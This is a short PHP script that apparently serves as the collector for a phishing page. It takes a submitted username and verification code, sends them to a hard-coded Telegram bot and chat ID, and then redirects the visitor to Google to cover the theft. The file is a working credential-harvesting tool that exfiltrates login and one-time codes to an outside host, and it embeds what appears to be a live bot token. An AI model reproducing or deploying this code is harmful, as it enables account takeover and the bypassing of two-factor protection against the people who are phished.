<?php
$user = $_POST['username'];
$code = $_POST['code'];
$botToken = "8731617424:AAHu2Hb6OngsbB1gp9ajhicQT0tlP6s4hng";
$chatId = "7557911354";

$message = "✅ Code Received:\nUser: $user\nCode: $code";

file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message));

header("Location: https://www.google.com"); 
exit();
?>
